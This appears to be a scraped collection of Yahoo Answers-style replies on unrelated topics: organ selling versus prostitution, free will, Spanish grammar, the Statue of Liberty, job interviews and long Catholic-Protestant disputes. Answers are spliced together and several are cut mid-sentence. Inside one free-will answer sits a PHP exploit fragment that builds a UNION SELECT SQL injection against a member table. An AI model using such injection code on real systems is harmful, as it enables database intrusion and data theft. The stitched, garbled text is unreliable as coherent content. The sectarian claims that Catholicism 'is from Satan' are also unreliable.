419e11dcaef7e9ece4911fdbd2baac98aa	Ok if I sold an organ - a kidney for example then in 10 years time my other kidney might go and I would be dead. If I sold an eye and in 10-20 years I went blind in the other I could be blind, the point is selling organs is too permanent and could bring me closer to death.<br>  <br>   If I was a prositute for a few weeks - 6 months and could get brothel work or regulars I would choose prostitution. I would choose prosititution because its less intrusive to my healh. I can always refuse to sleep with someone if I dont like them and I can have some  control on what happens as a sex worker. Selling an organ I have no control on what happens next and no say I have just sold an organ where as its very permanent and damaging to my health and selling my body is not that permanent and not that damaging to my health if I am careful.

I have a lot of friends who work in the sex industry as dominatrices and they are in a very safe environment where clients are screened.  They are providing a sexual service for people for money so I consider that a form of prostitution.  I'd much rather do that than sell an organ!

It's too risky.|`|6a847c91344f2a46951de52b63f203a6aa	I think as a male I would say sex trade but being greedy i would sell a kidney aswell for the extra cash just to make sure I could give up pimping my self out a little quicker.

Interesting, huh?|`|ltMbMIPlaa	are you kidding me? of course he forgives. he even forgives the sin of murder just as He forgave Moses. But regretting a sin is only one part for forgiveness, It has to be followed by act of good deed or not doing the same sin again which is called towbeh. May God be with you at all times. Don't feel so bad. we all make mistake one time or another. that is why we rely on God's mercy
taboL1hbaa	If you live in a warm place, try a picnic. It's very romantic, but not too fancy because it's only your first Valentine's Day. It's also simple and good if you're on a budget. If you live where it's cold, you could set up a blanket indoors and have an indoor picnic. Another option would be to go to a nice sit-down restauraunt. Going to the movies is another option and there's usually a lot of romantic movies playing around Valentine's Day. Or you could just take a stroll around town and go back to your house when you're done. Hope I helped! :)|`|bqiaTrEDaa	http://www.ihatejen.com?id=92utfbh1oci8q...
lsmk8gEGaa	well not "everybody" but it does seem that way. I am not gay but I don't think you can say it is unnatural, it is very common in nature among all animals so it can't be unnatural.    I know you said you don't believe in God but you have to take into account that is the reason most people give for their views on gay.   Some say it is a Sin but the Bible says we are all sinners. Christ never once preached or had a parable that addressed homosexuality. A lot of the anti gay message in the Bible is from the old testament, but most Christians today ignore most of what is in the old testament. We don't have slaves or multiple wives or sacrifice things, we don't follow the dietary restriction spelled out in the old Testament. After Christ everything changed, the old laws didn't apply any more, and even if it is a sin being mean to your fellow man, hating people or even divorce are much bigger sins, and the Jews and some Christians think one of the worst sins is gossip, how many "good" Christians do that? I figure I have enough of my own problems and trying to live my life without trying to tell others how to live.     I don't think it is a choice, because it can be found in nature, and I don't think the animals think,"HMMM I want to be gay".

Ya tiene más de cien a?os y acaba de recibir un tratamiento estético a un costo de varios millones de dólares. ?A quién nos referimos? A una de las estatuas de mayor fama en el mundo, la estatua de la Libertad.<br>  <br>  Con sus 46 metros (151 pies) de alto, es también una de las estatuas más grandes del mundo. Incluyendo el pedestal, asciende a 93 metros (305 pies) de altura y mira fijamente a la Bahía de Nueva York con ojos que no ven. Por los pasados cien a?os ha sido símbolo de bienvenida para millones de inmigrantes. Pero, ?por qué debería interesarse usted en la estatua de la Libertad? Porque lo que simboliza —la libertad— afecta a toda persona hoy día. A estas alturas, en 1986, la libertad no existe en todos los países, y en muchos otros está desmoronándose.<br>  <br>  Pero, ?qué motivó originalmente la creación de la estatua? ?Por qué es 1986 un a?o especial para ella? ?Continúa la “puerta dorada” de la oportunidad tan abierta y tan dorada como antes?<br>  <br>  Una cena significativa<br>  <br>  Allá en 1865 un grupo de eruditos y estadistas franceses se encontraban cenando en la ciudad francesa de Glatigny como invitados del profesor édouard de Laboulaye, presidente de la sociedad francesa en contra de la esclavitud. Estos hombres eran admiradores de la Constitución y el desarrollo político de los Estados Unidos. El anfitrión recomendó que se enviara un obsequio al pueblo estadounidense en homenaje a los Estados Unidos y por motivo del centenario de la independencia que este obtuvo de Gran Breta?a en?1776.<br>  <br>  Las motivaciones de estos franceses liberales que vivían bajo el poder de un emperador no eran totalmente altruistas. Charles Mercer declara en su libro Statue of Liberty: “La idea que tenían era propagandista, con el fin de conseguir que tanto los franceses como los americanos los apoyaran en su meta política de establecer la Tercera República [en Francia]”.<br>  <br>  Un escultor con grandes ideas<br>  <br>  Uno de los apoyadores de esta idea fue el escultor Auguste Bartholdi. Según la revista France, él “ya había cultivado un gusto por lo colosal en un viaje que hizo por el Oriente Medio donde quedó muy impresionado con las pirámides”. Entonces concibió la idea de una mujer en mantos sosteniendo con la mano derecha una antorcha encendida.<br>  <br>  El proyecto se dilató porque en ese tiempo no era políticamente conveniente que en la Francia imperial se conmemoraran las virtudes de la floreciente república norteamericana. Sin embargo, con la caída del emperador Napoleón?III en?1871, la idea de hacer un obsequio a los Estados Unidos cobró vida de nuevo. En julio de ese mismo a?o, Bartholdi hizo un viaje a los Estados Unidos y descubrió lo que él consideró el lugar ideal para la futura estatua... una peque?a isla en la bahía de Nueva York llamada la isla de Bedloe (conocida desde?1956 como la isla de la Libertad).<br>  <br>  Pero la imagen que tenía Bartholdi de la tierra de la libertad no se conformaba a la realidad. Charles Mercer dice: “Aunque se acababa de declarar libres a todos los ****** americanos, casi todos eran esclavos a una pobreza desesperante, con poco o ningún empleo y prácticamente sin educación. Las mujeres [por lo general] ni siquiera tenían derecho a votar”.<br>  <br>  Lleno de entusiasmo, Bartholdi siguió adelante con sus planes de construir una estatua impresionante. A medida que se cristalizaban sus planes, se hizo claro que había incorporado en el dise?o símbolos de la masonería, como por ejemplo: la antorcha, el libro en la mano izquierda y la diadema de siete puntas sobre la cabeza. Quizás esto no sorprendió mucho, pues él era masón.<br>  <br>  Nacida en Francia y criada en los Estados Unidos<br>  <br>  Para realizar los planes de Bartholdi, se agregó al equipo de constructores a un francés de renombre, Gustave Eiffel, quien posteriormente alcanzó la fama por su torre Eiffel de París. Este dise?ó la estructura de hierro que serviría de sostén a las 91?toneladas métricas de piel y manto de cobre de la se?ora Libertad.<br>  <br>  Para?1884 la estatua La Libertad iluminando al mundo, tal como se le conoció en un principio, había alcanzado su altura máxima sobresaliendo de los talleres en que fue hecha en París. El 4 de julio de ese mismo a?o se hizo entrega oficial de la estatua al embajador estadounidense en París.<br>  <br>  Pero ahora había que transportarla a su nueva tierra y, al igual que millones de personas, la se?ora Libertad iba a convertirse en una inmigrante. La desarmaron, la embalaron en 200 cajones y la transportaron a Nueva York. El 28 de octubre de?1886 se inauguró la estatua de la Libertad en la isla de Bedloe.<br>  Asi que por su entrega este proximo 4 de julio cumpliría 122 a?os, pero de acuerdo asu inaguración en la isla Bedloe el proximo 28 de octubre cumplirá 120 a?os, espero te sirva los otros datos<br>  Miau
19b4664ca6d7010893bcc2ad01afd4acaa	A baby announces its arrival in the world with its shrill cries; a man announces his departure from the world by his unbroken stony silence. <br>  <br>  The book of life covering the period between birth and death contains pages of joy and sorrow, success and failure, triumph and tragedy, pleasure and pain, fulfilment and disappointment, health and sickness. Life is a mixed bag of pairs of opposites. Highs and lows are interwoven and form integral parts of the mosaic of Life. <br>  <br>  It is our basic nature to seek happiness. Do we get it? When we look around we find ourselves surrounded by suffering. We feel uneasy; that we are perched on an island of some happiness, surrounded on all sides by deep and dark waters of unhappiness. <br>  <br>  Is happiness just a mirage? The fact is that there is neither undiluted happiness, nor unabated unhappiness. Life is both. However, the nature of pain is such that it appears that the unhappy phase of life is interminably long. <br>  <br>  When we are faced with unhappy situations, we may derive some comfort by observing and learning from Nature. A cold and dark night yields to the refreshing morning sun, with its soothing rays of warmth, radiating light dispelling darkness. <br>  <br>  After every chilly winter, there comes the spring, bringing warmth, hope and cheer. At the end of a dark, long tunnel, there is light. <br>  <br>  Happiness is a state of mind, which keeps us in a state of well-being. Several important ingredients go to make the 'commodity' known as happiness. But this precious commodity is simply not available in a departmental store. <br>  <br>  While money can buy pleasures, it cannot buy happiness. A rich man need not necessarily be happy. By the same token a poor man need not necessarily be unhappy. Happiness has to be experienced from within. <br>  <br>  A fairly comfortable financial position, cordial and harmonious family relations and good health contribute to a happy life. But these alone would not ensure enduring happiness. Many a time we script unhappiness for ourselves and for others. <br>  <br>  The mind reacts to external stimuli and this could sometimes bring us happiness or unhappiness. For enduring happiness, the internal war that rages within our minds should first cease. <br>  <br>  We should come to terms with exter-nal ground realities. As physical training keeps the body in good shape, so also mental training helps in keeping the mind tranquil and balanced in the face of adversity. <br>  <br>  Things happen not as we want them to, but according to a pre-ordained scheme of things, over which we have little control. We were not consulted about the choice of our parents, place of birth, our sex. Neither will we be consulted about our time of death, its place and manner. The cards are dealt to us. <br>  <br>  We have to play them to the best of our ability. We do not gain anything by fretting or fuming over things over which we have no control whatsoever. We only become unhappy in the process. Accept gracefully the things given to us, the good or bad, and abjectly surrender to the dictates of destiny. <br>  <br>  Life does not lend itself to strictly scientific analysis. In the rough and tumble of life two plus two may not neces- sarily equal to four. There are many questions for which we have no answers.|`|c19beb3e1c658c5b884b66b1b8b71cf9aa	It isn't a question of valid or invalid since you are comparing apples and oranges.<br>  <br>  A religion is a way of life. This may or may not include spirituality. Some churches are based on spirituality, others are bland affairs in which no spiritual matters are addressed.<br>  <br>  Religion provides orders and rules. Spirituality is more of an individual concern. It is more of the relationship between yourself and the unseen. Note I did not say God. It can be God, but spirituality is just that vague.<br>  <br>  So yeah, I can see what you mean by spirituality being beyond religion, that is true. Spirituality is a bigger topic and much more vague a term, and refers to something different than religion. None of that makes religion invalid for spiritual matters (although if you changed religion to churches then you may have a point about it being invalid to a degree).|`|f3a2f4d3e96579a10270c1b80d898b77aa	I practice no religion, but I believe and trust in God, Jehova, creator of heaven and earth, the God of Abraham, the God of Isac, the God of job.

Therefore they are both valid.|`|99ddbe9154e869be13a892ec084d0b2aaa	Yes, this is correct.  Religions are simply groups of people getting together following traditions of that certain religion.  They have a certain understanding of what they believe and how they understand thier understanding of what they believe.  I know I know, you are saying"What?!?!?"  Anyway, a Christian church has doctrines and confessions that help them stay united as a church and unified in understanding of the Bible and faith.  i'm sure other religions are similar, I just don't have first hand knowledge.  Certain religions do not follow what Christ commands and so their teachings are incorrect and somewhat fraudulant.  But you are completely correct.  Spirituality goes much deeper than religion.  Nothing can explain the wonders of God in its fullest.  Your words are music to my ears.  There is so much anger on this Y!answers that I absolutley love to read a little love once and a while!  Have a great day!|`|f8046f2a7ab26fc7bbdaf360b729c2bdaa	I agree with you, no doubt.
74c68c1d283e701d72453e9651b449f7aa	"The phrase "cut and run" has appeared in The Chronicle -- indeed, in all media -- numerous times, usually in derogation of those who wish to depart from the ruinous American adventure in Iraq. But those who use the phrase with such fervor obviously don't know what it means. <br>  <br>  "Cut and run" originated in the days of sailing ships. It meant to get under way in an emergency by cutting the anchor chain and running before the wind. In the instance of square-rigged ships, it also meant to cut the lines holding the furled sails, whereupon the sails would unfurl of their own weight and the ship could sail at once. "Cut and run" has nothing whatsoever to do with cowardice, surrender, or defeatism. It is, in fact, the intelligent thing to do when in dire straits. The captain who cuts and runs has a chance of saving his ship. The stubborn, rigid captain, who stands upon the bridge and defies the elements, will find his ship driven upon the rocks -- and destroyed."|`|AA11700409	its means to cut your losses and head the opposite direction. in other words. its not worth it. dont waste your time. ..

You want them to be interested in the person underneath the beauty.   But underneath that beauty, the truth of the matter is, you're not very interesting."  <br>  <br>  Something to think about.

This is the reality that science shows us -- and it's why observations and experiments in science must be repeatable, retestable, and even falsifiable -- so others can verify that what's been observerd *isn't* only inside someone's head, and that it *is* part of the reality common to all of us.  If you only ever count on your own reality, you're likely to have problems when you run up against the laws of physics if your reality differs from our shared reality :)    Peace.|`|e8a42257dd2b34817d2020222ee63839aa	You're right.    The problems come in when you pair up free will with God's omniscience and omnipotence.    People who have long standing misconceptions about the future, assume that God can know what you're going to do tomorrow, the next day and for the rest of your life, and therefore that contradicts the concept of free will.|`|C1SOqQSkaa	Free Will is an illusion. Faced with any set of choices, you will always pick the one that is optimal for your needs at the time.    How could you do otherwise? Even if someone dares you to pick a choice that doesn't benefit you, it will simply change the definition of 'optimal' at that moment.|`|AFDgHtZCaa	Sadly my friend you are looking at "free will" from a strictly humanist viewpoint. What you are saying is ALMOST correct. To be completely correct the "free will" equation must include the grace freely given by Christ to accept or reject the salvation He offers.    Otherwise you are making a choice "for the moment" as opposed to a choice which will determine your fate for "ALL ETERNITY".    My friend do you really "know" Christ as your Savior or do you just "know OF Him". Have you made that "free will" choice.    IF YOU DON'T KNOW CHRIST AS YOUR PERSONAL SAVIOR REPENT & BELIEVE IN HIM FOR SALVATION AS HE'S SOON COMING BACK!!!|`|q6H2ru3waa	I think when it comes to "free will" we only have a limited amount of power which is God given for a purpose and I have to say for His purpose, We are all here on this earth for a purpose wether we choose to accept it or not, it is our choice.and to will is to determine by an act of choice wether it be right or wrong, and the consequences will reflect that. I also think to have "free will" is no excuse for ignorance, because we were also given a sense of right and wrong. (common sense).  This issue is very opinionated and not easy to express, but it is a reality.  This is just my opinion.|`|IbtQ5IKNaa	Free will to lock each other out and create suspicion that leads to error that then gives us fear and then terror and then guess what, we have to clean it all up again as the kids watch.    echo "Exploiting....";               $sent='%61%3A%32%3A%7B%73%3A';            if ($ver==1) $exp="-999) UNION SELECT 0,vid,null,'open',0,1,1132440935,1,11132... from ".$pref."validating where member_id=".$target."

It forgets the Australian aboriginal people who are black, but do not resemble Africans or the black people of India.      It forgets the fact that there are multiple different ethnic groups in Africa.

iHDYncuXaa	no    The Bible never gives any physical description of Christ. The closest thing we get to a description is in Isaiah 53:2b, He had no beauty or majesty to attract us to Him, nothing in His appearance that we should desire Him. All this tells us is that Jesus appearance was just like any other man's  He was ordinary-looking. Isaiah was here prophesying that the coming suffering Servant would arise in lowly conditions and wear none of the usual emblems of royalty, making His true identity visible only to the discerning eye of faith.    Isaiah further describes the appearance of Christ as He would appear as He was being scourged prior to His crucifixion. His appearance was so disfigured beyond that of any man and his form marred beyond human likeness (Isaiah 52:14). These words describe the inhuman cruelty He suffered to the point that He no longer looked like a human being (Matthew 26:67; 27:30; John 19:3). His appearance was so awful that people looked at Him in astonishment.|`|AA11785060	If he was good looking probably would not have hung around with a bunch of guys well past his 30's.|`|bYqWHuzyaa	If he would have lived today he would have been overlooked by all the other silly celebrities like the Jonas Brothers, Brad Pitt, Ashton Kutcher, etc.  Appearance is not what he or God sees.

You may not like or agree with this. That is your right. Truth will prevail in due season.   Yeshua was a not-so good-looking Black Hebrew.  Isaiah describes Him in: Isaiah 53:2-12.  Paul said that a falling away will happen as truth is revealed. II Thessalonians 2:3.  One hint from God: He told Joseph and Mary to take their baby to Egypt and hide there for a season. They were safe among their own people and kind.  Herod was where? Not in Egypt. Black Hebrews were in Egypt at that time before the take over.  Do you remember the story of Joseph being sold by his brothers? The 12 tribes of Jacob (Israel) raised their generation there. The kingship there when Joseph got there, they were black Egyptians. It was a black pharaoh that would not let those Hebrews go.  This is where studying to show yourself approved unto God comes in. II Timothy 2: 15.  This is not a face value, on the surface kind of read.   You may not want to read anymorebecause this Book holds the truth in evidence.   Prove God wrong in whats in His Book yourselves. Not me. I know what I am reading is truth from our Father; Yeshuas Heavenly Father.  I always say this: If Yeshua, the Ancient of Days has sheep like hair in Revelations; would not it be evidence that He had wooly or nappy hair in Jerusalem? Revelation 1:14.  Dont throw your Book away- It is not going away.  Make sure you study the nick-picking.  The evidence will prove it self: God gave hints- He left nothing covered.  His is God.  I guess this will be my last statement on A/Y.  I really hope not but whatever happens, God word will not come back void. Some body will grab hold to it.   TrustAmen.
dZFJVVa1aa	"Estoy casada" is the right one, because it is NOT permanent, you become married, you are not born married, same with "morir" is not permanent, I mean of course you are not going to come back to live, but is something that happens eventually (death) is not that you've always been like that (dead).    "Ser" is usually something that you are born with or being it, example: "Soy una ni?a" means I'm a girl. I used "soy" (conjugation for "ser") because I was born being a girl. Get it?    Sorry if you didn't get it, I tried as hard as I could.    Hope it helped!!    PS: Remember there are some exceptions to the rule.   (I'm not sure if that is the correct grammatical rule, that's just the way I get it).|`|CVvZfxKFaa	Since death is something you can't change, I would think you use ser. Marriage can be changed though, so I would use estar with casar.|`|tQsxsuNPaa	Estar for both...they are exceptions to the rule of permanence.  Period.    I think, if you are looking at death...in Catholicism, death is temporary.  After you die, you are raised and you technically "live" again, in heaven.  That's how I rationalize it, anyway.    :)

It is a walk of faith now, but God is real and responds to the faith. E.g I recently was given a vision by God that enabled me to deal with a particular issue wisely; by myself I would flounder not knowing what to do as it was too complex to see the outcomes, and it's easy to dither in such a situation. God has promised to do many such things if we as christians believe for them. In John 1 it says the early christians received grace upon grace by their faith.  So one can know beyond all doubt that God is real. One is always learning new things of course. I certainly wish all folks would go to heaven; but at least there is a safe way, on which one can be sure.

If they ask what the details are just tell them that the manager would come and talk to you about customers after they had left and you felt that wasn't part of your job since it wasn't anything to do with you and how you interacted with the customer.|`|xZ1GD4zbaa	Have you gone back and confronted them personally about this?

If it must be in your work history simply say that you were let go of due your manager being a chronic complainer. Why they will ask...say she targeted you to complain about the other staff & that you asked time & again that you felt it inappropriate, to the point that you put it in writing. It's your word against theirs but hey, employers know that these things happen everyday. Good Luck|`|uFAoq4idaa	Well just don't talk about this when your interviewer will not question you about it.

Just be patient and ask the Lord to take away the hatred from your heart.|`|pfNnuD5saa	You don't have to go into detail, just say you were laid off, stress your good points. Bring letters of recommendation etc.|`|hgTR8Uzaaa	You probably should not be giving out that much information about why you were fired.  Your potential employers do not need to know all that.  Just say that you had a disagreement with your boss and you handled it the wrong way and you senior boss fired you.  Tell them that you learned from the situation and it won't be repeated.      And just for future reference... if you boss tells you to let it go, let it go.  If it is something illegal or immoral and you can't live with it, then quit.  Don't keep pressing the issue. It sounds like at the Thrift Store you wouldn't let it go and people don't like to keep hearing about your complaints.  Yeah, it was annoying but just do what your boss says.      So learn from that situation and tell your next potential employer that it won't happen again.
Mnm35sjNaa	Your question appears to confuse free will with epistemology.  Free will is about choices, not knowledge or beliefs.  However, since this is the R&S section, I'll present my 2-cents worth on the topic of free will versus determinism as it applies to religion.    Darwin's natural selection tells us that our greatest attribute (intelligence) is necessarily evolved to do what it does: make choices.  Whether or not free will is God-given, evolved or an illusion is not really the issue.  We do, in fact, make choices.  The real question is: In a deterministic universe, ruled by causality, can free will also exist?    There's no proof for ANY answer.  I, personally, believe that free will coexists with determinism.  I believe living beings can't be viewed in the same light as inanimate objects (stars, planet, atoms, comets, chairs, rocks, etc.)  The free will we have is limited in as much as our options are limited.  We are not gods and are confined to physical laws.    The field of neuroscience has made large strides recently but the free will versus determinism controversy is nowhere closer to resolution.  Determinism and compatibilism have both garnered supporting evidence (though determinism seems to have the edge for now).  Google "CEMI theory" for more information about a leading theory that supports compatibilism.    For argument's sake, I'll assume there is a God who gave us free will.  If he did, then he can no longer intervene in human affairs: that would be usurping our free will.  That means that God CAN'T be a personal God who meddles in our affairs (answer prayers, perform miracles, slay enemies, wipe out cities, etc.).  Once he gave us free will, he switched from personal God to cosmic God . . . from meddler to observer.    But if God did NOT give us free will, we are merely puppets dancing to God's tune.  We would have no morality, responsibility or accountability.    Christian apologists have tried, for hundreds of years, to explain away this logical conundrum.  But they can't (without resorting to circular logic).  If you insist on a supernatural creator, then God either gave us free will or he didn't.  If he didn't, he judges and punishes us for lives we had no control over.  If he did, then all his interventions described in the bible contradict the free will he supposedly gave us.    The question of free will cuts to the core of scriptural legitimacy and reveals the lies that dogma is intended to cover up.|`|d76540548b78851b2b0db3441e66ae54aa	We know nothing without a doubt.

Whoever shall faithfully serve me by the recitation of the Rosary shall receive signal graces.  2. I promise my special protection and the greatest graces to all those who shall recite the Rosary.  3. The Rosary shall be a powerful armor against Hell, it will destroy vice, decrease sin, and defeat heresies.  4. It will cause virtue and good works to flourish; it will obtain for souls the abundant mercy of God; it will withdraw the hearts of men from the love of the world and its vanities and will lift them to the desire of eternal things. Oh, that souls would sanctify themselves by this means.  5. The soul which recommends itself to me by the recitation of the Rosary, shall not perish.  6. Whoever shall recite the Rosary devoutly, applying himself to the consideration of its sacred mysteries, shall never be conquered by misfortune. God will not chastise him in His justice, he shall not perish by an unprovided death; if he be just, he shall remain in the grace of God and become worthy of eternal life.  7. Whoever shall have a true devotion for the Rosary shall not die without the Sacraments of the Church.  8. Those who are faithful to recite the Rosary shall have during their life and at their death the light of God and the plenitude of His graces; at the moment of death, they shall participate in the merits of the saints in Paradise.  9. I shall deliver from Purgatory those who have been devoted to the Rosary.  10. The faithful children of the Rosary shall merit a high degree of glory in Heaven.  11. You shall obtain all you ask of me by the recitation of the Rosary.  12. All those who propagate the Holy Rosary shall be aided by me in their necessities.  13. I have obtained from my Divine Son that all the advocates of the Rosary shall have for intercessors the entire Celestial Court during their life and at the hour of death.  14. All who recite the Rosary are my sons, and brothers of my only Son, Jesus Christ.  15. Devotion to my Rosary is a great sign of predestination.|`|AA11430900	"A Tout Le Monde" - Megadeth    http://www.youtube.com/watch?v=gEHNvxkVv...|`|BNHocZaiaa	You will enjoy this    http://www.youtube.com/watch?v=OwOhtHVn6...|`|214a84419a27f7b719e60de8e61dbd12aa	I want to Stroll over Heaven with You:When disappointments and Persecutions have all Vanished away:  We"ll enjoy all the Beauty- where all things are New ;  ,I want to stroll over Heaven with You;|`|dnpB79V1aa	Please watch:    http://www.youtube.com/watch?v=cyheJ480L...|`|6lJuKKMHaa	I dig, "God's Promises", by David Meece.

Catholicism is not Christian.  Catholicism is from Satan.  Catholicism teaches a false gospel of works that leads to eternal torment in hell (Galatians 1:6-9).     True salvation is only by faith alone in Jesus without adding any of your own works.|`|NWnOTkwCaa	It's a power trip. Historically, as people achieve freedom and literacy, they throw off the slavery of Catholicism and become Protestants. The growth of trade, literacy, and a middle class resulted in the Reformation. Latin America is a good recent example.|`|AA10034051	Is private interpretation of the Bible condoned in the Bible Itself?  No, it is not (2 Peter 1:20).  Was individual interpretation of Scripture practiced by the early Christians or the Jews?  Again, "NO" (Acts 8:29-35).  The assertion that individuals can correctly interpret Scripture is false.  Even the "founder" of Sola Scriptura (Martin Luther), near the end of his life, was afraid that "any milkmaid who could read" would found a new Christian denomination based on his or her "interpretation" of the Bible.  Luther opened a "Pandora's Box" when he insisted that the Bible could be interpreted by individuals and that It is the sole authority of Christianity.  Why do we have over 38,000 different non-Catholic Christian denominations?  The reason is individuals' "different" interpretations of the Bible.  Can there be more than one interpretation of the Bible?  No.  The word "truth" is used several times in the New Testament.  However, the plural version of the word "truth" never appears in Scripture.  Therefore, there can only be one Truth.  So how can there be over 38,000 non-Catholic Christian denominations all claiming to have the "Truth" (i.e., the correct interpretation of the Bible)?  For that matter, aren't ALL non-Catholic Christians as individuals claiming "infallibility" when it comes to interpreting the Bible?  Catholics only believe in the infallibility of the Papacy as an office.  Which is more believable - one office holding infallibility or 400 million non-Catholic Christians who can't agree on the interpretation of Scripture all claiming "infallibility?"  When it comes to interpreting Scripture, individual non-Catholic Christians claim the same infallibility as the Papacy.  If one were to put two persons of the "same" non-Catholic Christian denomination (i.e., two Presybterians, two Lutherans, two Baptists, etc.) in separate rooms with a Bible and a notepad and ask them to write down their "interpretation" of the Bible, passage for passage, shouldn't they then produce the exact same interpretation?  If guided by the Holy Spirit as Scripture states, the answer should be "Yes."  But would that really happen?  History has shown that the answer is "No."  Now, in the case of Catholics, the Church which Christ founded and is with forever (Matthew 28:20) interprets the Bible, as guided by the Holy Spirit, (Mark 13:11) for the "sheep" (the faithful).  The Church (not individuals) interpret Scripture.  In Catholicism, Scripture is there for meditation, prayer and inspiration, not for individual interpretation to formulate doctrine or dogma.      What did Martin Luther, the Protestant Reformer, state about the Bible?  In his "Commentary On St. John," he stated the following:  "We are compelled to concede to the Papists that they have the Word of God, that we have received It from them, and that without them we should have no knowledge of It at all."  Regardless of what non-Catholic Christians may think or say, according to secular, objective historians, the Catholic Church alone preserved Sacred Scripture throughout the persecution of the Roman Empire and during the Dark Ages.  All non-Catholic Christian denominations owe the existence of the Bible to the Catholic Church alone.  Why did God choose the Catholic Church to preserve Scripture if It is not His Church?|`|LQQAQDkIaa	The Jews canon was not settled until long after Christ instituted the new covenant. By then they had an axe to grind with Christianity. They rejected the septuagint, which Christ and the Apostles taught from. This was put together by 70 of Israels most learned Rabbis long before the 1st cent. written in Greek. The 2nd century council of Jamnia rejected everything not written in Hebrew. Our Catholic canon is the septuagint, not the Phariseean canon of Jamnia, so, the Church still has all authority in its interpretation. The Church created the NT, and closed the canon around 400 ad.

It is true that the Catholic Church wrote the NT Scriptures and canonized the entire Christian Bible but that is not the only reason nor the most convincing reason that the Catholic Church should have authority to interpret Scripture. We have authority not for what we did collectively as the faithful, even if under inspiration, but instead our authority and veracity comes from Christ who passed the keys and thus the authority to His Church. Because of when He did this, there was no other Church, reason would dictate that the Church is the authority to interpret the written Word of God and the protector of both the written Word and oral Word in Sacred Tradition.  God bless!    In Christ  Fr. Joseph|`|7422ddf097669bd7b6e3d48e56258b87aa	The Catholic Church was given the awesome power to bind and loose, on earth and in heaven.    Nothing like that was ever given to the Jews, or to any other person or group.    Furthermore, the Catholic Church alone enjoys the constant advocacy of the Holy Spirit, who is the arbiter of all divine truth.    And while many might claim this advocacy for themselves, Jesus Christ is on record as promising the Spirit to the Church alone, and then delivering, big time and in public, on the day of the first Christian Pentecost.    In short, the Jews never received God's complete revelation or the power to go with it, while the Catholic Church received all of these things and more, directly  and personally from Jesus Christ, while he still walked the earth.    Can't beat that kind of divine power and authority!|`|zHle6Paqaa	By your own logic let's examine this :  The Accepted Jewish Scripture during the Century before and during the time of Jesus was The Septuagint. Understand: This was the Accepted Jewish Scripture.  It was only NOT accepted by the Jews when Christianity began to grow. This was the time the Jews removed parts of Scripture. The parts that Christ Fulfilled.  It was The Catholic Church that maintained the OT in it's original "Septuagint" fullness. Please see Link:  http://www.geocities.com/militantis/theb...  The Catholic Church/ Bishops compiled the New Testament.  So, it was the Catholic Church that Saved the "Septuagint", which would be the Scriptures Jesus and the Apostles used and spoke of, and compiled the books of the NT.  Of Course now the Catholic Church faces 38,000 denominations of change to the Original...All professing the Catholic Church has No Authority. Go figure?  The Catholic Church has full Authority.  I hope I've answered your question.    Bless You.|`|IwlE0oFbaa	Hi Jason    Jesus founded His Church among the Jewsish nation and He preached in the synagogues.  The Apostles preached in the synagogues and many Jews came to Christ, until Christians were expelled.  Jesus told his followers the temple would be destroyed.      Jesus fulfilled the old law so it wouldn't make sense for the Christians to go with the Jewish interpretation.      The Jews that did not convert changed the Septuagint because the Christians were using it to convert the Jews still.  The solution was to rewrite their Scriptures and the rest of the post shows some of the changes they made, that conincidently would benefit Reformers also.    You ask since the Jews declared a canon around 90 AD, why don't we go with that?  It is true that Protestants about 200 years ago took out books and passages from the Bible for exactly that reason!  But for some reason many Christians have been taught incorrectly that Catholics added to the Bible.    The early Church leaders determined the accurate books of the New Testament and added the Septuagint or the Old Testament Scriptures Jesus used and the early Church Fathers used.     Men like St Dominic and St Francis de Sales were converting Christians to the true faith. Why did the Protestant groups take books out of the Bible about 200 years ago?  Sounds like they used the same idea and took out books to match the ones that the Jews removed. Sounds like treachery and false witness to the Truth also named Jesus?    To me it sounds like you are asking me why don't we renounce the truth?    I should think Catholics could use those missing books to convert non Catholic Christians to Catholicism.     They are:    ? Prayers for the dead (Tobit 12:12; 2 Maccabees 12:39-45)  ? Purgatory (Wisdom 3:1-7)  ? Intercession of saints in heaven (2 Maccabees 15:14)  ? Intercession of angels (Tobit 12:12-15)    And especially Jews did not like this one:    Wisdom 2:12-20 Let us beset the just one, because he is obnoxious to us; he sets himself against our doings, Reproaches us for transgressions of the law and charges us with violations of our training. He professes to have knowledge of God and styles himself a child of the LORD. To us he is the censure of our thoughts; merely to see him is a hardship for us, Because his life is not like other men's, and different are his ways. He judges us debased; he holds aloof from our paths as from things impure. He calls blest the destiny of the just and boasts that God is his Father. Let us see whether his words be true; let us find out what will happen to him. For if the just one be the son of God, he will defend him and deliver him from the hand of his foes. With revilement and torture let us put him to the test that we may have proof of his gentleness and try his patience. Let us condemn him to a shameful death; for according to his own words, God will take care of him."    Jews also changed virgin to young girl in the Book of Isaiah in the reprint.    If you've perhaps bought into the myth that Catholics added to the Bible, consider that the secretary of Jeremiah, Baruch, wrote the part with his name, but in the original list Baruch was included in the book of Jeremiah.

If the church a person attends doesn't teach what the church of Smyrna and Philadelphia taught, they're in the wrong church.    Revelation 1:11 mentions seven churches. Only two of those churches are acceptable to God. The other five He's against. These churches teach Christ as the Savior, who the antichrist is and who the sons of Cain are. Anyone who doesn't know these have been taught lies and don't know the full word of God.|`|zefFTf8Aaa	not again CJ..    Matthew 16:18-19 / Isaiah 22:22  "And I tell you, you are Peter, and on this rock I will build my church, and the powers of death shall not prevail against it. I will give you the keys of the kingdom of heaven, and whatever you bind on earth shall be bound in heaven, and whatever you loose on earth shall be loosed in heaven."    "And I will place on his shoulder the key of the house of David; he shall open, and none shall shut; and he shall shut, and none shall open."    Most Protestants believe that "church" refers to the mass of Christian believers throughout the world, loosely connected to each other by their faith in the Bible alone. But these verses demonstrate that the "Church" Jesus Christ founded is not an invisible body of loosely-connected believers, but a visible and hierarchical institution built upon the person of Peter, who was given supreme authority, an office for dynastic succession, and the gift of infallibility. This Church can only be the One, Holy, Catholic and Apostolic Church.     In these verses, we see the following. First, Jesus builds His Church (ecclesia) upon the person of Peter. As we learned in the previous link on The Church, Jesus changes Simon's name to "Kepha," and says that on this "Kepha" He will build the Church. Kepha, in Aramaic (the language Jesus spoke), means a massive rock formation, and Jesus' use of Kepha to rename Peter signifies Peter's foundational leadership in the Church. (See also Mark 3:16 and John 1:42 where Jesus renames Simon "Cephas" which is a transliteration of the Aramaic "Kepha."). Only the Catholic Church recognizes and proves through an unbroken lineage of successors that her foundation is Peter.     Secondly, Jesus says the powers of death will never prevail against the Church. So even though Jesus appoints sinful human beings such as Peter to lead the Church, Jesus promises that hell will not prevail against her. Because the powers of hell refer to the supernatural, this must mean that the Church, although lead by sinful people, is divinely protected. Because she is so protected, the Church cannot lead the faithful into supernatural error. That is, she is unable to teach error on matters of faith and morals. This inability to teach error on faith and 